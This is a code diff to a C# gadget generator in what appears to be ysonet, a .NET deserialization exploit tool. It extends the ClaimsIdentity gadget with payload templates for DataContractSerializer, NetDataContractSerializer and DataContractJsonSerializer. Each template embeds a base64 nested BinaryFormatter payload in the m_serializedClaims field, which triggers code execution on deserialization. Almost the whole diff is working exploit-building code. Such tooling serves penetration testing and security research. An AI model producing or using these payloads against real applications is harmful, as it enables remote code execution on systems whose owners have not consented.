@@ -14,14 +14,23 @@ namespace ysonet.Generators
         {
             return new GadgetFacetSet()
                 .WithKinds(PayloadKind.NestedDeserialization)
-                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework);
+                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
+                // System.Security.Claims is 4.5+; fired on 4.8.1
+                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
         }
 
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "SoapFormatter", "LosFormatter" };
+            return new List<string> { "BinaryFormatter", "SoapFormatter", "DataContractSerializer", "DataContractJsonSerializer", "NetDataContractSerializer", "LosFormatter" };
         }
+
+        // ClaimsIdentity is in mscorlib. The DataContract serializers import it as a data
+        // contract whose optional string member m_serializedClaims is the sink, so they carry
+        // the inner payload directly. On deserialize, the [OnDeserialized] callback runs
+        // DeserializeClaims, which base64-decodes the field and runs a nested BinaryFormatter.
+        private const string MscorlibAssembly = "mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
+        private const string ClaimsContractNs = "http://schemas.datacontract.org/2004/07/System.Security.Claims";
 
         public override string Finders()
         {
@@ -49,7 +58,7 @@ namespace ysonet.Generators
             else
             {
                 IGenerator generator = new TextFormattingRunPropertiesGenerator();
-                binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
+                binaryFormatterPayload = (byte[])generator.GenerateInner("BinaryFormatter", inputArgs);
             }
 
             var b64encoded = Convert.ToBase64String(binaryFormatterPayload);
@@ -164,6 +173,55 @@ namespace ysonet.Generators
                     {
                         Debugging.ShowErrors(inputArgs, err);
                     }
+                }
+                return payload;
+            }
+            else if (formatter.ToLower().Equals("datacontractserializer"))
+            {
+                string payload = $@"<root type=""System.Security.Claims.ClaimsIdentity, {MscorlibAssembly}"">
+<ClaimsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns=""{ClaimsContractNs}"">
+<m_serializedClaims>{b64encoded}</m_serializedClaims>
+</ClaimsIdentity>
+</root>";
+                if (inputArgs.Minify)
+                {
+                    payload = inputArgs.UseSimpleType ? XmlMinifier.Minify(payload, new string[] { "mscorlib" }, null) : XmlMinifier.Minify(payload, null, null);
+                }
+                if (inputArgs.Test)
+                {
+                    try { SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type"); }
+                    catch (Exception err) { Debugging.ShowErrors(inputArgs, err); }
+                }
+                return payload;
+            }
+            else if (formatter.ToLower().Equals("netdatacontractserializer"))
+            {
+                string payload = $@"<ClaimsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Id=""1"" z:Type=""System.Security.Claims.ClaimsIdentity"" z:Assembly=""0"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns=""{ClaimsContractNs}"">
+<m_serializedClaims z:Id=""2"">{b64encoded}</m_serializedClaims>
+</ClaimsIdentity>
+";
+                if (inputArgs.Minify)
+                {
+                    payload = inputArgs.UseSimpleType ? XmlMinifier.Minify(payload, new string[] { "mscorlib" }, null) : XmlMinifier.Minify(payload, null, null);
+                }
+                if (inputArgs.Test)
+                {
+                    try { SerializersHelper.NetDataContractSerializer_deserialize(payload); }
+                    catch (Exception err) { Debugging.ShowErrors(inputArgs, err); }
+                }
+                return payload;
+            }
+            else if (formatter.ToLower().Equals("datacontractjsonserializer"))
+            {
+                string payload = $@"{{""m_serializedClaims"":""{b64encoded}""}}";
+                if (inputArgs.Minify)
+                {
+                    payload = inputArgs.UseSimpleType ? JsonMinifier.Minify(payload, new string[] { "mscorlib" }, null) : JsonMinifier.Minify(payload, null, null);
+                }
+                if (inputArgs.Test)
+                {
+                    try { SerializersHelper.DataContractJsonSerializer_deserialize(payload, "System.Security.Claims.ClaimsIdentity, " + MscorlibAssembly, null); }
+                    catch (Exception err) { Debugging.ShowErrors(inputArgs, err); }
                 }
                 return payload;
             }
